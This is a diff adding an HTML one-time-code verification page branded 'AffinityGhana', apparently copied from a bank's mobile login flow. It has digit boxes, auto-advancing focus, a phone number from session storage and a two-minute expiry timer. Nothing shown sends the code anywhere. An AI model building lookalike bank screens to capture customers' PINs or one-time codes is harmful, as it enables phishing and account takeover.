@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AffinityGhana - Verify</title>
+<link rel="icon" type="image/png" href="assets/logo.png">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app">
+  <div class="page otp-page">
+
+    <a href="pin.html" class="back-btn">‹</a>
+    <h2 class="otp-header">Confirmation code</h2>
+
+    <div class="illustration-wrap">
+      <div class="illustration-circle peach">
+        <img src="assets/icon-otp.png" alt="">
+      </div>
+    </div>
+
+    <h1 class="title">Verify your number</h1>
+    <p class="subtitle">Enter the 4-digit code we sent to <span id="otpPhoneDisplay">0536115032</span></p>
+
+    <div class="otp-boxes" id="otpBoxesWrap">
+      <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="one-time-code">
+      <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+      <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+      <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+    </div>
+
+    <p class="resend-timer" id="resendTimerP">You can resend code in <span id="otpTimer">2:00</span></p>
+
+    <div class="ussd-link">Use USSD instead</div>
+
+  </div>
+</div>
+
+<script>
+  // Show the phone number entered on page 2, formatted like the reference (leading 0)
+  var savedPhone = sessionStorage.getItem('affinity_phone');
+  var otpPhoneDisplay = document.getElementById('otpPhoneDisplay');
+  if (savedPhone) {
+    otpPhoneDisplay.textContent = '0' + savedPhone.replace(/^0+/, '');
+  }
+
+  // Auto-advance between OTP boxes, using the device's native keyboard
+  var otpBoxes = document.querySelectorAll('.otp-box');
+  otpBoxes.forEach(function (box, idx) {
+    box.addEventListener('input', function () {
+      box.value = box.value.replace(/\D/g, '');
+      if (box.value && idx < otpBoxes.length - 1) {
+        otpBoxes[idx + 1].focus();
+      }
+    });
+    box.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !box.value && idx > 0) {
+        otpBoxes[idx - 1].focus();
+      }
+    });
+  });
+  otpBoxes[0].focus();
+
+  // 2-minute countdown; when it hits zero, just stop (lock input, no action)
+  var otpTimerEl = document.getElementById('otpTimer');
+  var otpBoxesWrap = document.getElementById('otpBoxesWrap');
+  var resendTimerP = document.getElementById('resendTimerP');
+  var secondsLeft = 120;
+
+  function updateOtpTimerDisplay(total) {
+    var m = Math.floor(total / 60);
+    var s = total % 60;
+    otpTimerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+  }
+  updateOtpTimerDisplay(secondsLeft);
+
+  var otpInterval = setInterval(function () {
+    secondsLeft--;
+    if (secondsLeft <= 0) {
+      clearInterval(otpInterval);
+      otpBoxesWrap.classList.add('locked');
+      resendTimerP.classList.add('expired');
+      otpTimerEl.textContent = 'expired';
+      return;
+    }
+    updateOtpTimerDisplay(secondsLeft);
+  }, 1000);
+</script>
+
+</body>
+</html>
